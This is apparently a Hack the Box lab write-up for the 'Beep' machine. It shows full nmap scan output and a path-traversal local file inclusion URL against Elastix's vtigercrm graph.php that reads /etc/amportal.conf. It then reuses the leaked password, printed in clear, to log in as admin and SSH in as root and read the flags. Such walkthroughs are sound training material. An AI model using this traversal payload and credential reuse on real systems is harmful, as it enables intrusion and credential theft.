# Beep - Hack the Box

## Scanning

Nmap Scan

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled.png)

nmap -p- 10.10.10.7 (Full port Scan)

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%201.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%201.png)

nmap -sV -A 10.10.10.7 (Service version scanning)

```jsx
root@kali:~# nmap -sV -A 10.10.10.7
Starting Nmap 7.80SVN ( https://nmap.org ) at 2020-09-17 10:41 EDT
Nmap scan report for 10.10.10.7
Host is up (0.22s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: TOP IMPLEMENTATION(Cyrus POP3 server v2) UIDL APOP RESP-CODES PIPELINING STLS EXPIRE(NEVER) USER AUTH-RESP-CODE LOGIN-DELAY(0)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ATOMIC LIST-SUBSCRIBED MAILBOX-REFERRALS ID SORT IMAP4 URLAUTHA0001 THREAD=REFERENCES NO X-NETSCAPE OK STARTTLS RIGHTS=kxte LITERAL+ NAMESPACE CONDSTORE THREAD=ORDEREDSUBJECT LISTEXT IDLE CATENATE SORT=MODSEQ QUOTA ANNOTATEMORE BINARY IMAP4rev1 Completed ACL CHILDREN RENAME UNSELECT MULTIAPPEND UIDPLUS
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2020-09-17T14:48:07+00:00; +1m50s from scanner time.
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80SVN%E=4%D=9/17%OT=22%CT=1%CU=33906%PV=Y%DS=2%DC=T%G=Y%TM=5F63
OS:7726%P=i686-pc-linux-gnu)SEQ(SP=CA%GCD=1%ISR=CD%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=CA%GCD=1%ISR=CC%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M
OS:54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=16A0%W2=16A
OS:0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW7%
OS:CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W
OS:=16A0%S=O%A=S+%F=AS%O=M54DST11NW7%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 1m49s

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   222.74 ms 10.10.14.1
2   222.96 ms 10.10.10.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 379.29 seconds
root@kali:~#
```

## Enumeration

**Enumerating Web**

PORT 80

Browsing https://10.10.10.7/

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%202.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%202.png)

Elastix cms is vulnerable to local file inclusion

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%203.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%203.png)

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%204.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%204.png)

Browse [http://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf&module=Accounts&action](http://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action) 

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%205.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%205.png)

This file consists of some username and password.

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%206.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%206.png)

Using credential admin and jEhdIekWmdjE to login in [https://10.10.10.7](https://10.10.10.7/)

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%207.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%207.png)

**Successfully Logged in

## Exploitation

Using password jEhdIekWmdjE to login using ssh as root user.

Command – **ssh [root@10.10.10.7](mailto:root@10.10.10.7)**

**Password-**  jEhdIekWmdjE

**Successfully got shell of root user.

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%208.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%208.png)

**cd /home/fanis**

**cat user.txt**

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%209.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%209.png)

**cd /root**

**cat root.txt**

![Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%208.png](Beep%202d979aa2e6674b1c8e02e7e6f188c5d8/Untitled%208.png)
